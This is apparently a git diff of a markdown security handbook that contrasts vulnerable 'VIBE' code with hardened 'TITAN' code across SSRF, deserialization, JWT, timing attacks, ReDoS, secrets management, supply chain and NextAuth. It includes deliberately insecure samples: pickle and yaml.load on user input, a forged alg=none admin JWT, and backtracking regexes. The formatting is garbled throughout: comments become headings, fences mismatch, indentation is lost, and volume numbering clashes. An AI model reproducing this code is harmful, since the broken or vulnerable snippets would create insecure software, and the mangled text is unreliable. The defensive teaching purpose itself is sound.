 provided_hash = hashlib.sha256(provided.encode()).hexdigest()
-
 
 ## Constant-time comparison of hashes
 return secrets.compare_digest(provided_hash, stored_hash)
 
 ```text
 
-
 ## END OF VOLUME 1.5: TITAN SUPPLY CHAIN & IDENTITY ATTACKS
 
 ---
 
-
 ## VOLUME 1.6: TITAN DEEP INTERNALS - APPLICATION SECURITY MECHANICS
-
 
 ## OAUTH 2.0: PKCE MANDATORY
 
@@ -8724,7 +8131,6 @@ return secrets.compare_digest(provided_hash, stored_hash)
 
 ```python
 
-
 ## TITAN: PKCE Implementation
 
 import secrets
@@ -8734,7 +8140,6 @@ import base64
 class PKCEClient:
 def generate_verifier(self):
 
-
 ## 43-128 chars, cryptographically random
 
 self.verifier = base64.urlsafe_b64encode(
@@ -8743,7 +8148,6 @@ self.verifier = base64.urlsafe_b64encode(
 return self.verifier
 
 def generate_challenge(self):
-
 
 ## S256: SHA256 hash of verifier, base64url encoded
 
@@ -8768,7 +8172,6 @@ return f"{auth_endpoint}?" + urlencode(params)
 
 def exchange_code(self, token_endpoint, code, client_id, redirect_uri):
 
-
 ## Include verifier in token request
 response = requests.post(token_endpoint, data={
 'grant_type': 'authorization_code',
@@ -8781,9 +8184,7 @@ return response.json()
 
 ```text
 
-
 ## SSRF BYPASS TECHNIQUES
-
 
 ## IP Address Bypass Scar
 
@@ -8793,7 +8194,6 @@ return response.json()
 > Defense in depth: Block at network level + resolve before fetch."
 
 ```python
-
 
 ## TITAN: Comprehensive SSRF Protection
 
@@ -8822,7 +8222,6 @@ hostname = parsed.hostname
 if not hostname:
 return False
 
-
 ## Block file:// and other dangerous schemes
 
 if parsed.scheme not in ('http', 'https'):
@@ -8830,19 +8229,16 @@ return False
 
         try:
 
-
 ## Resolve BEFORE making request (prevents DNS rebinding)
 
 ip_str = socket.gethostbyname(hostname)
 ip = ipaddress.ip_address(ip_str)
-
 
 ## Check against blocklist
 
 for network in BLOCKED_NETWORKS:
 if ip in network:
 return False
-
 
 ## Cache DNS result to prevent rebinding between check and use
 
@@ -8856,7 +8252,6 @@ def fetch(self, url):
 if not self.is_safe_url(url):
 raise SSRFError(f"Blocked URL: {url}")
 
-
 ## Use cached IP to prevent DNS rebinding
 parsed = urlparse(url)
 safe_url = url.replace(
@@ -8868,9 +8263,7 @@ return requests.get(safe_url, timeout=5)
 
 ```text
 
-
 ## DESERIALIZATION ATTACKS
-
 
 ## Object Injection Deep Dive
 
@@ -8881,29 +8274,24 @@ return requests.get(safe_url, timeout=5)
 
 ```python
 
-
 ## VIBE: Arbitrary code execution
 
 import pickle
 data = request.get_json()['data']
 obj = pickle.loads(base64.b64decode(data))  # RCE!
 
-
 ## VIBE: YAML load is unsafe
 
 import yaml
 config = yaml.load(user_input)  # RCE via !!python/object
 
-
 ## TITAN: Safe alternatives
 
 import json
 
-
 ## JSON is safe (no code execution)
 
 obj = json.loads(user_input)
-
 
 ## If schema needed, use explicit parsing
 
@@ -8915,33 +8303,27 @@ age: int
 
 validated = UserInput.parse_raw(user_input)
 
-
 ## If you MUST deserialize complex objects
 
 import jsonpickle
 jsonpickle.set_decoder_options('json', cls=SafeDecoder)
 
-
 ## Plus: Whitelist of allowed classes
 
 ```yaml
-
 
 ## TITAN: Safe YAML
 
 import yaml
 
-
 ## Always use safe_load
 
 config = yaml.safe_load(user_input)
-
 
 ## For custom objects, be explicit
 
 class SafeLoader(yaml.SafeLoader):
         pass
-
 
 ## Only allow specific types
 
@@ -8955,9 +8337,7 @@ config = yaml.load(user_input, Loader=SafeLoader)
 
 ```text
 
-
 ## CSP BYPASS TECHNIQUES
-
 
 ## Content Security Policy Evasion
 
@@ -8966,6 +8346,7 @@ config = yaml.load(user_input, Loader=SafeLoader)
 > Nonce-based CSP: Only scripts with matching nonce execute."
 
 ```html
+
 <!-- VIBE: Overly permissive CSP -->
 <meta http-equiv="Content-Security-Policy"
 content="script-src 'self' https://cdn.example.com">
@@ -8985,7 +8366,6 @@ form-action 'self';">
 </script>
 
 ```python
-
 
 ## TITAN: Server-side nonce generation
 
@@ -9015,9 +8395,7 @@ return response
 
 ```text
 
-
 ## RACE CONDITION VULNERABILITIES
-
 
 ## Time-of-Check to Time-of-Use (TOCTOU)
 
@@ -9028,17 +8406,14 @@ return response
 
 ```python
 
-
 ## VIBE: Race condition vulnerable
 
 async def transfer(from_account, to_account, amount):
-
 
 ## Check
 
 balance = await db.get_balance(from_account)
 if balance >= amount:  # Race window starts
-
 
 ## Time
 
@@ -9047,12 +8422,10 @@ await db.update_balance(to_account, amount)  # Race window ends
 return True
 return False
 
-
 ## TITAN: Atomic operation with row locking
 
 async def transfer(from_account, to_account, amount):
 async with db.transaction():
-
 
 ## SELECT FOR UPDATE locks the row
 
@@ -9072,7 +8445,6 @@ SET balance = balance + $1
 WHERE id = $2
 """, amount, to_account)
 
-
 ## TITAN: Optimistic locking with version
 
 async def update_with_cas(id, expected_version, new_data):
@@ -9087,14 +8459,11 @@ raise ConcurrentModificationError("Retry required")
 
 ```text
 
-
 ## END OF VOLUME 1.6: TITAN DEEP INTERNALS - APPLICATION SECURITY MECHANICS
 
 ---
 
-
 ## VOLUME 1.7: TITAN GEMINI RESEARCH - ADVANCED ATTACK PATTERNS
-
 
 ## JWT NONE ALGORITHM ATTACK
 
@@ -9106,36 +8475,28 @@ raise ConcurrentModificationError("Retry required")
 
 ```python
 
-
 ## VIBE: Accepts any algorithm
 
 import jwt
 
 def verify_token(token):
 
-
 ## VULNERABLE: algorithms not specified
 
 payload = jwt.decode(token, secret_key)  # Accepts 'none'!
 return payload
 
-
 ## Attacker creates
-
 
 ## Header: {"alg": "none", "typ": "JWT"}
 
-
 ## Payload: {"sub": "admin", "role": "superuser"}
 
-
 ## Signature: (empty)
-
 
 ## Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJzdXBlcnVzZXIifQ
 
 ```python
-
 
 ## TITAN: Explicit algorithm whitelist
 
@@ -9160,21 +8521,15 @@ return payload
 except jwt.InvalidTokenError as e:
 raise AuthenticationError(f"Invalid token: {e}")
 
-
 ## TITAN: Prevent algorithm confusion (RS256 vs HS256)
-
 
 ## If using RS256 (asymmetric), attacker might
 
-
 ## 1. Get public key (often exposed)
-
 
 ## 2. Sign token with HS256 using public key as secret
 
-
 ## 3. Server verifies with same "secret" = valid signature
-
 
 ## Defense: NEVER use same key handling for both
 
@@ -9184,8 +8539,8 @@ header = jwt.get_unverified_header(token)
 if header['alg'] not in ALLOWED_ALGORITHMS:
 raise AuthenticationError(f"Algorithm not allowed: {header['alg']}")
 
-
 ## Use correct key based on algorithm
+
 if header['alg'].startswith('RS') or header['alg'].startswith('ES'):
 key = PUBLIC_KEY
     else:
@@ -9195,9 +8550,7 @@ return jwt.decode(token, key, algorithms=[header['alg']])
 
 ```text
 
-
 ## TIMING ATTACKS AGAINST STRING COMPARISON
-
 
 ## The Scar
 
@@ -9208,21 +8561,16 @@ return jwt.decode(token, key, algorithms=[header['alg']])
 
 ```yaml
 
-
 ## VIBE: Timing-vulnerable comparison
 
 def verify_api_key(provided_key, stored_key):
 return provided_key == stored_key  # VULNERABLE!
 
-
 ## First character mismatch: ~100ns
-
 
 ## Last character mismatch: ~1000ns
 
-
 ## Attacker can detect the difference
-
 
 ## VIBE: Early return on mismatch
 
@@ -9236,7 +8584,6 @@ return True
 
 ```python
 
-
 ## TITAN: Constant-time comparison 2
 
 import hmac
@@ -9244,9 +8591,7 @@ import secrets
 
 def verify_api_key(provided_key: str, stored_key: str) -> bool:
 
-
 ## hmac.compare_digest is constant-time
-
 
 ## Takes same time regardless of where mismatch occurs
 
@@ -9255,69 +8600,51 @@ return hmac.compare_digest(
         stored_key.encode('utf-8')
     )
 
-
 ## TITAN: For hashed passwords, use dedicated library
 
 from passlib.hash import argon2
 
 def verify_password(provided: str, hashed: str) -> bool:
 
-
 ## argon2.verify is constant-time internally
 
 return argon2.verify(provided, hashed)
 
-
 ## TITAN: Node.js constant-time comparison
-
 
 ## const crypto = require('crypto');
 
 #
 
-
 ## function verifyApiKey(provided, stored) {
-
 
 ## // crypto.timingSafeEqual is constant-time
 
-
 ## const a = Buffer.from(provided);
-
 
 ## const b = Buffer.from(stored);
 
 #
 
-
 ## 2
-
 
 ## if (a.length !== b.length) {
 
-
 ## // Still compare to prevent length oracle
 
-
 ## return crypto.timingSafeEqual(a, a) && false;
-
 
 ## }
 
 ```text
 
-
 ## 3
-
 
 ## return crypto.timingSafeEqual(a, b);
 
-
 ## } 2
 
-
 ## REDOS - REGEX DENIAL OF SERVICE
-
 
 ## The Scar 2
 
@@ -9326,11 +8653,9 @@ return argon2.verify(provided, hashed)
 > Regex engine backtracks 2^28 times. Server hangs.
 > CPU 100% for minutes on single request."
 
-
 ## VIBE: Catastrophic backtracking patterns
 
 import re
-
 
 ## These regexes have exponential backtracking
 
@@ -9340,31 +8665,25 @@ BAD_HTML = r'<.*>.*</.*>'  # Greedy with overlap
 
 def validate_email(email):
 
-
 ## With input: 'a' *30 + '!'
 
-
 ## Takes MINUTES to return False
+
 return re.match(BAD_EMAIL + r'example\.com$', email)
 
 ```python
-
 
 ## TITAN: Safe regex patterns
 
 import re
 
-
 ## Use possessive quantifiers or atomic groups (not in Python re)
 
-
 ## Or rewrite to avoid nested quantifiers
-
 
 ## Safe email validation (no nested quantifiers)
 
 SAFE_EMAIL = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
-
 
 ## TITAN: Use regex with timeouts
 
@@ -9386,21 +8705,17 @@ return None
         finally:
         signal.alarm(0)
 
-
 ## TITAN: Use linear-time regex engine
 
 import google_re2 as re2  # Google RE2 guarantees linear time
 
 def validate_input(pattern, text):
 
-
 ## RE2 uses finite automata, no backtracking
-
 
 ## Guaranteed O(n) time complexity
 
 return re2.match(pattern, text)
-
 
 ## TITAN: Pre-validate input length
 
@@ -9413,9 +8728,7 @@ return re.match(pattern, text)
 
 ```text
 
-
 ## UNICODE NORMALIZATION ATTACKS
-
 
 ## The Scar 3
 
@@ -9424,26 +8737,21 @@ return re.match(pattern, text)
 > Or: File path with %c0%ae%c0%ae becomes '..' after normalization.
 > Directory traversal bypasses security filter."
 
-
 ## VIBE: Filter before normalization
 
 def check_username(username):
 if username.lower() == 'admin':
 raise ValueError("Reserved username")
 
-
 ## Save to database (which normalizes Unicode)
 
 return username
 
-
 ## Attacker passes: (circled letters)
-
 
 ## Filter passes. Database normalizes to 'admin'
 
 ```python
-
 
 ## TITAN: Normalize BEFORE checking
 
@@ -9451,24 +8759,19 @@ import unicodedata
 
 def sanitize_username(username: str) -> str:
 
-
 ## Normalize to NFKC (compatibility composition)
-
 
 ## Converts l, a, III, etc
 
 normalized = unicodedata.normalize('NFKC', username)
 
-
 ## Remove zero-width characters (invisible)
-
 
 ## U+200B (zero-width space), U+200C (ZWNJ), U+200D (ZWJ), U+FEFF (BOM)
 
 invisible_chars = ['\u200b', '\u200c', '\u200d', '\ufeff', '\u00ad']
 for char in invisible_chars:
 normalized = normalized.replace(char, '')
-
 
 ## Now check against reserved names
 
@@ -9477,38 +8780,30 @@ raise ValueError("Reserved username")
 
 return normalized
 
-
 ## TITAN: Confusable character detection
 
 from confusables import is_confusable, normalize
 
 def check_homograph(input_str, protected_str):
 
-
 ## Detect visually similar characters
-
 
 ## (Cyrillic vs 'paypal.com' (Latin 'a')
 
 return is_confusable(input_str, protected_str)
 
-
 ## TITAN: Locale-aware case conversion (Turkish problem)
 
 def safe_lowercase(text: str, locale: str = 'en') -> str:
 
-
 ## Turkish: 'I'.lower() should be (dotless i), not 'i'
-
 
 ## Don't use .lower() for security comparisons
 
 import icu  # PyICU
 return icu.UnicodeString(text).toLower(icu.Locale(locale))
 
-
 ## BUFFER OVERFLOW PREVENTION PATTERNS
-
 
 ## The Scar 4
 
@@ -9531,7 +8826,6 @@ buffer[i] = input[i];
 }
 
 // TITAN: Bounded string operations
-
 
 ## include <string.h>
 
@@ -9559,14 +8853,11 @@ buffer[sizeof(buffer) - 1] = '\0';  // Ensure null termination
 
 ```text
 
-
 ## END OF VOLUME 1.7: TITAN GEMINI RESEARCH - ADVANCED ATTACK PATTERNS
 
 ---
 
-
 ## VOLUME 2: TITAN GEMINI RESEARCH - AUTH AND SECRETS PRODUCTION
-
 
 ## JWT SECURITY PITFALLS
 
@@ -9587,6 +8878,7 @@ return jwt.verify(token, SECRET_KEY);  // Accepts ANY algorithm!
 // Attacker sets header: {"alg": "none"}, removes signature = valid token
 
 ```typescript
+
 // TITAN: Strict JWT verification
 import jwt, { JwtPayload, Algorithm } from 'jsonwebtoken';
 
@@ -9698,7 +8990,6 @@ refreshToken: this.createRefreshToken(decoded.sub),
 
 ```text
 
-
 ## SECRETS MANAGEMENT WITH VAULT
 
 ### The Scar
@@ -9710,7 +9001,6 @@ refreshToken: this.createRefreshToken(decoded.sub),
 
 ```python
 
-
 ## VIBE: Hardcoded secrets
 
 import os
@@ -9718,13 +9008,11 @@ import os
 AWS_KEY = "AKIAIOSFODNN7EXAMPLE"  # Hardcoded!
 AWS_SECRET = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"  # Hardcoded!
 
-
 ## Or slightly better but still dangerous
 
 AWS_KEY = os.getenv("AWS_KEY")  # In .env, might get committed
 
 ```python
-
 
 ## TITAN: HashiCorp Vault integration
 
@@ -9741,7 +9029,6 @@ self.client = hvac.Client(url=vault_addr)
 self.auth_method = auth_method
 self.lease_cache: dict[str, tuple[dict, datetime]] = {}
 
-
 ## Authenticate based on environment
 
         self._authenticate()
@@ -9750,7 +9037,6 @@ def _authenticate(self):
 """Authenticate to Vault using appropriate method."""
 
 if self.auth_method == 'kubernetes':
-
 
 ## Read service account token
 
@@ -9764,7 +9050,6 @@ jwt = f.read()
 
 elif self.auth_method == 'aws':
 
-
 ## IAM authentication
 
         self.client.auth.aws.iam_login(
@@ -9773,7 +9058,6 @@ elif self.auth_method == 'aws':
         )
 
 elif self.auth_method == 'approle':
-
 
 ## For CI/CD
 
@@ -9786,7 +9070,6 @@ import os
 def get_secret(self, path: str, key: str) -> str:
 """Get a secret value with caching and lease management."""
 
-
 ## Check cache
 
 cache_key = f"{path}:{key}"
@@ -9794,7 +9077,6 @@ if cache_key in self.lease_cache:
 secret, expires_at = self.lease_cache[cache_key]
 if datetime.now() < expires_at:
 return secret[key]
-
 
 ## Fetch from Vault
 
@@ -9804,7 +9086,6 @@ response = self.client.secrets.kv.v2.read_secret_version(
         )
 
 secret = response['data']['data']
-
 
 ## Cache with lease
 
@@ -9825,7 +9106,6 @@ response = self.client.secrets.database.generate_credentials(
 username = response['data']['username']
 password = response['data']['password']
 
-
 ## Log for audit
 
 logging.info(f"Generated dynamic DB creds for role {role}, lease_id: {response['lease_id']}")
@@ -9835,16 +9115,13 @@ return username, password
 def rotate_api_key(self, key_name: str) -> str:
 """Rotate an API key with zero downtime."""
 
-
 ## 1. Generate new key
 
 new_key = secrets.token_urlsafe(32)
 
-
 ## 2. Read current key
 
 current = self.get_secret(f'api-keys/{key_name}', 'current')
-
 
 ## 3. Update Vault with both keys active
 
@@ -9860,7 +9137,6 @@ current = self.get_secret(f'api-keys/{key_name}', 'current')
 
 return new_key
 
-
 ## Usage
 
 vault = VaultSecretManager(
@@ -9868,11 +9144,9 @@ vault = VaultSecretManager(
         auth_method='kubernetes'
     )
 
-
 ## Get static secret
 
 api_key = vault.get_secret('myapp/config', 'stripe_api_key')
-
 
 ## Get dynamic database credentials
 
@@ -9880,9 +9154,7 @@ db_user, db_pass = vault.get_dynamic_database_credentials('myapp-readonly')
 
 ```text
 
-
 ## API KEY ROTATION
-
 
 ## The Scar 5
 
@@ -9890,7 +9162,6 @@ db_user, db_pass = vault.get_dynamic_database_credentials('myapp-readonly')
 > Employee left, still had the key.
 > Used it from competitor company.
 > No audit trail. Couldn't prove breach source."
-
 
 ## VIBE: Static API keys
 
@@ -9903,7 +9174,6 @@ raise HTTPException(401)
 return {"data": "secret"}
 
 ```python
-
 
 ## TITAN: Rotating API keys with audit trail
 
@@ -9928,13 +9198,11 @@ expires_in_days: int = 365
 ) -> tuple[str, str]:
 """Create new API key. Returns (key_id, secret) - secret shown only once!"""
 
-
 ## Generate key components
 
 key_id = f"sk_{secrets.token_urlsafe(8)}"
 key_secret = secrets.token_urlsafe(32)
 key_hash = self._hash_key(key_secret)
-
 
 ## Store in database (NEVER store the secret!)
 
@@ -9952,11 +9220,9 @@ await self.db.api_keys.create(
         }
         )
 
-
 ## Audit log
 
 await self._audit_log(user_id, 'API_KEY_CREATED', {'key_id': key_id, 'name': name})
-
 
 ## Return full key (only time it's visible)
 
@@ -9971,7 +9237,6 @@ key_id, key_secret = full_key.split('.', 1)
 except ValueError:
 return None
 
-
 ## Check cache first
 
 cache_key = f"apikey:{key_id}"
@@ -9980,7 +9245,6 @@ cached = await self.redis.get(cache_key)
 if cached:
 key_data = json.loads(cached)
         else:
-
 
 ## Fetch from database
 
@@ -9991,11 +9255,9 @@ where={'id': key_id}
 if not key_data:
 return None
 
-
 ## Cache for 5 minutes
 
 await self.redis.setex(cache_key, 300, json.dumps(key_data))
-
 
 ## Verify hash
 
@@ -10003,19 +9265,16 @@ if not self._verify_key(key_secret, key_data['key_hash']):
 await self._audit_log(None, 'API_KEY_INVALID_SECRET', {'key_id': key_id})
 return None
 
-
 ## Check expiration
 
 if datetime.fromisoformat(key_data['expires_at']) < datetime.utcnow():
 await self._audit_log(key_data['user_id'], 'API_KEY_EXPIRED', {'key_id': key_id})
 return None
 
-
 ## Check if revoked
 
 if key_data.get('revoked_at'):
 return None
-
 
 ## Update last used (async, don't block request)
 
@@ -10035,7 +9294,6 @@ old_key = await self.db.api_keys.find_unique(where={'id': key_id})
 if not old_key:
 raise ValueError("Key not found")
 
-
 ## Create new key
 
 new_key_id, new_full_key = await self.create_api_key(
@@ -10043,7 +9301,6 @@ new_key_id, new_full_key = await self.create_api_key(
 name=f"{old_key['name']} (rotated)",
         permissions=old_key['permissions']
         )
-
 
 ## Mark old key for deprecation (still valid for 24 hours)
 
@@ -10054,7 +9311,6 @@ where={'id': key_id},
 'expires_at': datetime.utcnow() + timedelta(hours=24)
         }
         )
-
 
 ## Invalidate cache
 await self.redis.delete(f"apikey:{key_id}")
@@ -10085,14 +9341,11 @@ return secrets.compare_digest(
 
 ```text
 
-
 ## END OF VOLUME 2: TITAN GEMINI RESEARCH - AUTH AND SECRETS PRODUCTION
 
 ---
 
-
 ## VOLUME 3: TITAN GEMINI RESEARCH - SUPPLY CHAIN SECURITY
-
 
 ## DEPENDENCY VULNERABILITY DISASTERS
 
@@ -10105,14 +9358,11 @@ return secrets.compare_digest(
 
 ```yaml
 
-
 ## VIBE: No dependency scanning
-
 
 ## Just run npm install and hope nothing bad happens
 
 ```yaml
-
 
 ## TITAN: GitHub Actions with dependency scanning and SBOM
 
@@ -10133,7 +9383,6 @@ runs-on: ubuntu-latest
 
 - uses: actions/checkout@v4
 
-
 ## Generate SBOM (Software Bill of Materials)
 
 - name: Generate SBOM
@@ -10143,7 +9392,6 @@ uses: anchore/sbom-action@v0
 path: .
 format: spdx-json
 output-file: sbom.spdx.json
-
 
 ## Scan for vulnerabilities
 
@@ -10155,7 +9403,6 @@ sbom: sbom.spdx.json
 fail-build: true
 severity-cutoff: high
 
-
 ## Check for known malicious packages
 
 - name: Malware Scan
@@ -10166,7 +9413,6 @@ npx lockfile-lint --path package-lock.json \
 --validate-package-names \
         --validate-checksum
 
-
 ## Upload SBOM as artifact
 
 - uses: actions/upload-artifact@v3
@@ -10174,7 +9420,6 @@ npx lockfile-lint --path package-lock.json \
         with:
 name: sbom
 path: sbom.spdx.json
-
 
 ## Attest SBOM for provenance
 
@@ -10194,7 +9439,6 @@ runs-on: ubuntu-latest
 
 run: docker build -t myapp:${{ github.sha }} .
 
-
 ## Scan container image
 
 - name: Trivy container scan
@@ -10207,14 +9451,14 @@ output: trivy-results.sarif
 severity: 'CRITICAL,HIGH'
 exit-code: 1
 
-
 ## Upload scan results
+
 - uses: github/codeql-action/upload-sarif@v2
+
         with:
 sarif_file: trivy-results.sarif
 
 ```python
-
 
 ## TITAN: Continuous dependency monitoring
 
@@ -10242,7 +9486,6 @@ async def scan_monorepo(self, repo_path: str) -> list[VulnerabilityAlert]:
 """Scan all services in monorepo for vulnerabilities."""
 alerts = []
 
-
 ## Find all package.json files
 
 result = subprocess.run(
@@ -10254,7 +9497,6 @@ package_files = result.stdout.strip().split('\n')
 
 for pkg_file in package_files:
 service_name = pkg_file.split('/')[-2]
-
 
 ## Run npm audit
 
@@ -10277,7 +9519,6 @@ cve_id=vuln_info.get('via', [{}])[0].get('cve', 'N/A'),
 fixed_version=vuln_info.get('fixAvailable', {}).get('version'),
         affected_services=[service_name]
         )
-
 
 ## Deduplicate
 alert_key = f"{alert.package}:{alert.cve_id}"
@@ -10331,9 +9572,7 @@ await self._send_slack(message)
 
 ```text
 
-
 ## CONTAINER IMAGE SIGNING
-
 
 ## The Scar 6
 
@@ -10342,15 +9581,14 @@ await self._send_slack(message)
 > No signature verification. Running attacker's code.
 > Detected 3 weeks later during security audit."
 
-
 ## VIBE: Pull any image, trust registry
 
 spec:
   containers:
+
 - image: registry.io/app:latest  # Anyone could have pushed this
 
 ```yaml
-
 
 ## TITAN: Cosign image signing and verification
 
@@ -10387,7 +9625,6 @@ uses: docker/build-push-action@v5
 push: true
 tags: ghcr.io/${{ github.repository }}:${{ github.sha }}
 
-
 ## Sign with keyless signing (Sigstore)
 
 - name: Sign Image
@@ -10397,7 +9634,6 @@ COSIGN_EXPERIMENTAL: 1
 | run: |
 cosign sign --yes \
 ghcr.io/${{ github.repository }}@${{ steps.build.outputs.digest }}
-
 
 ## Attest SBOM
 - name: Attest SBOM
@@ -10409,9 +9645,7 @@ ghcr.io/${{ github.repository }}@${{ steps.build.outputs.digest }}
 
 ```yaml
 
-
 ## TITAN: Kubernetes admission controller for signature verification
-
 
 ## Kyverno policy
 
@@ -10461,14 +9695,11 @@ url: <<<<<https://rekor.sigstore.dev>>>>>
 operator: GreaterThan
 value: "2024-01-01T00:00:00Z"
 
-
 ## END OF VOLUME 3: TITAN GEMINI RESEARCH - SUPPLY CHAIN SECURITY
 
 ---
 
-
 ## VOLUME 5: ADVANCED SECURITY PATTERNS
-
 
 ## OWASP TOP 10 PROTECTION
 
@@ -10600,7 +9831,6 @@ dangerouslySetInnerHTML={{ __html: sanitized }}
 
 ---
 
-
 ## AUTHENTICATION HARDENING
 
 ### Secure Password Handling
@@ -10695,7 +9925,6 @@ return { valid: errors.length === 0, errors };
 ```text
 
 ---
-
 
 ## RATE LIMITING & BRUTE FORCE PROTECTION
 
@@ -10809,7 +10038,6 @@ res.set('X-RateLimit-Remaining', String(remaining));
 
 ---
 
-
 ## SECRET MANAGEMENT
 
 ### HashiCorp Vault Integration
@@ -10895,16 +10123,13 @@ max: 20
 
 ---
 
-
 ## VOLUME 6: REAL 2024 NEXTAUTH.JS PRODUCTION ISSUES
-
 
 ## Source: Stack Overflow, GitHub Issues, Developer Reports
 
 > ?? **This is REAL authentication debugging knowledge from production apps.**
 
 ---
-
 
 ## SESSION NOT PERSISTING
 
@@ -11023,7 +10248,6 @@ router.push('/dashboard'); // Manual redirect
 
 ---
 
-
 ## CALLBACK ERRORS
 
 ### OAuth Callback URL Mismatch
@@ -11066,15 +10290,11 @@ Error: MISSING_NEXTAUTH_API_ROUTE_ERROR
 
 ```bash
 
-
 ## WRONG: [...nextAuth].ts (capital A)
-
 
 ## CORRECT: [...nextauth].ts (lowercase)
 
-
 ## Git might not track case-only changes
-
 
 ## Force rename
 
@@ -11084,7 +10304,6 @@ git mv 'pages/api/auth/[...nextauth-temp].ts' 'pages/api/auth/[...nextauth].ts'
 ```text
 
 ---
-
 
 ## CALLBACK CONFIGURATION FOR CUSTOM DATA
 
@@ -11185,7 +10404,6 @@ role: string;
 
 ---
 
-
 ## DECISION TREE: NEXTAUTH TROUBLESHOOTING
 
 ```text
@@ -11220,7 +10438,6 @@ NEXTAUTH ISSUE
 
 ---
 
-
 ## PRODUCTION CHECKLIST
 
 ```python
@@ -11244,16 +10461,13 @@ Before Deploying NextAuth:
 
 ---
 
-
 ## VOLUME 7: REAL 2024 JWT SECURITY PATTERNS
-
 
 ## Source: Security Research, CVEs, Production Experience
 
 > ?? **This is REAL authentication security knowledge from production apps.**
 
 ---
-
 
 ## JWT VULNERABILITIES
 
@@ -11305,7 +10519,6 @@ algorithms: ['HS256', 'RS256'],  // Explicit whitelist, never 'none'
 ```text
 
 ---
-
 
 ## REFRESH TOKEN ROTATION
 
@@ -11381,7 +10594,6 @@ refreshToken: newRefreshToken.token
 
 ---
 
-
 ## SECURE TOKEN STORAGE
 
 ```typescript
@@ -11416,7 +10628,6 @@ path: '/api/auth/refresh'  // Only sent to refresh endpoint
 
 ---
 
-
 ## TOKEN LIFETIME BEST PRACTICES
 
 ```typescript
@@ -11445,7 +10656,6 @@ lifetime: '30d',
 ```text
 
 ---
-
 
 ## LOGOUT PROPERLY
 
@@ -11488,7 +10698,6 @@ res.json({ success: true });
 
 ---
 
-
 ## DECISION TREE: JWT DEBUGGING
 
 ```text
@@ -11524,7 +10733,6 @@ JWT ISSUE
 ```text
 
 ---
-
 
 ## JWT SECURITY CHECKLIST
 
@@ -11565,16 +10773,13 @@ cors: 'credentials: include with specific origins',
 
 ---
 
-
 ## VOLUME 8: REAL OWASP SECURITY PATTERNS 2024
-
 
 ## Source: OWASP Top 10, Production Experience, Security Research
 
 > ?? **This is REAL security knowledge - vulnerabilities = data breaches.**
 
 ---
-
 
 ## SQL INJECTION PREVENTION
 
@@ -11605,7 +10810,6 @@ const { rows } = await pool.query(
 ```text
 
 ---
-
 
 ## XSS PREVENTION 3
 
@@ -11644,7 +10848,6 @@ value: "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';
     }];
   }
 };
-
 
 ## CSRF PREVENTION
 
@@ -11694,7 +10897,6 @@ sameSite: 'lax'  // or 'strict' for max protection
 
 ---
 
-
 ## SECURE HEADERS
 
 ```typescript
@@ -11724,7 +10926,6 @@ return response;
 ```text
 
 ---
-
 
 ## INPUT VALIDATION 6
 
@@ -11762,7 +10963,6 @@ const fileSchema = z.object({
 mimetype: z.enum(['image/jpeg', 'image/png', 'image/webp']),
 size: z.number().max(5 *1024* 1024),  // 5MB max
 });
-
 
 ## DECISION TREE: SECURITY AUDIT
 
@@ -11807,9 +11007,7 @@ SECURITY CHECK
 
 ---
 
-
 ## REAL INPUT VALIDATION PATTERNS 2024
-
 
 ## SQL Injection Prevention 2
 
@@ -11830,7 +11028,6 @@ where: { id: userId }
 // Input validation before database
 const userIdSchema = z.string().uuid();
 const validatedId = userIdSchema.parse(userId);
-
 
 ## XSS Prevention 4
 
@@ -11870,7 +11067,6 @@ font-src 'self';
 connect-src 'self' <<<<<https://api.example.com;>>>>>`.replace(/\s+/g, ' ').trim()
   }
 ];
-
 
 ## CSRF Protection 5
 
@@ -11923,7 +11119,6 @@ return res.status(403).json({ error: 'Invalid CSRF token' });
   next();
 }
 
-
 ## Password Hashing 2
 
 import { hash, verify } from '@node-rs/argon2';
@@ -11959,7 +11154,6 @@ const passwordSchema = z
 .regex(/[a-z]/, 'Password must contain a lowercase letter')
 .regex(/[0-9]/, 'Password must contain a number')
 .regex(/[^A-Za-z0-9]/, 'Password must contain a special character');
-
 
 ## API Key Security
 
@@ -12021,12 +11215,9 @@ req.user = user;
 
 ```text
 
-
 ## VOLUME 6: DATABASE PRODUCTION FAILURES
 
-
 ## VOLUME 1.5: TITAN VAULT - SUPPLY CHAIN & IDENTITY ATTACKS 2
-
 
 ## JWT ALGORITHM CONFUSION ATTACK 2
 
@@ -12036,7 +11227,6 @@ req.user = user;
 > Attacker changes alg header to HS256.
 > Uses PUBLIC KEY as HMAC secret. Signs forged token.
 > Server verifies with public key as secret = VALID. Full account takeover."
-
 
 ## TITAN: Strict Algorithm Enforcement 2
 
@@ -12048,7 +11238,6 @@ NEVER trust the 'alg' header from the token itself.
 Explicitly specify allowed algorithms.
         """
         try:
-
 
 ## CRITICAL: algorithms parameter is a WHITELIST 2
 
@@ -12064,13 +11253,11 @@ raise SecurityException("Algorithm mismatch - possible attack")
 except jwt.ExpiredSignatureError:
 raise SecurityException("Token expired")
 
-
 ## Additional JWT Pitfalls 2
 
 > "1. 'none' algorithm: Token with alg='none' and no signature
 > 2. Kid injection: kid header used in SQL query = SQLi
 > 3. JKU spoofing: jku points to attacker-controlled JWKS URL"
-
 
 ## OPENID CONNECT VULNERABILITIES 2
 
@@ -12135,7 +11322,6 @@ throw new SecurityException("Nonce mismatch - replay attack");
         }
     }
 
-
 ## DEPENDENCY CONFUSION ATTACK 2
 
 ### Private Package Hijacking Scar 2
@@ -12145,24 +11331,18 @@ throw new SecurityException("Nonce mismatch - replay attack");
 > Build system checks public registry FIRST with higher version.
 > Downloads malicious package. Executes in CI/CD. Full supply chain compromise."
 
-
 ## TITAN: npm Registry Scoping 2
-
 
 ## .npmrc - Force scoped packages to private registry 2
 
     @mycompany:registry=<<<<<https://npm.mycompany.com/>>>>>
     //npm.mycompany.com/:_authToken=${NPM_TOKEN}
 
-
 ## For all internal packages, use scope 2
-
 
 ## @mycompany/analytics-internal (cannot be confused) 2
 
-
 ## TITAN: Python pip.conf for private packages 2
-
 
 ## pip.conf 2
 
@@ -12170,33 +11350,25 @@ throw new SecurityException("Nonce mismatch - replay attack");
 index-url = <<<<<https://pypi.mycompany.com/simple/>>>>>
 extra-index-url = <<<<<https://pypi.org/simple/>>>>>
 
-
 ## CRITICAL: Prefer private index 2
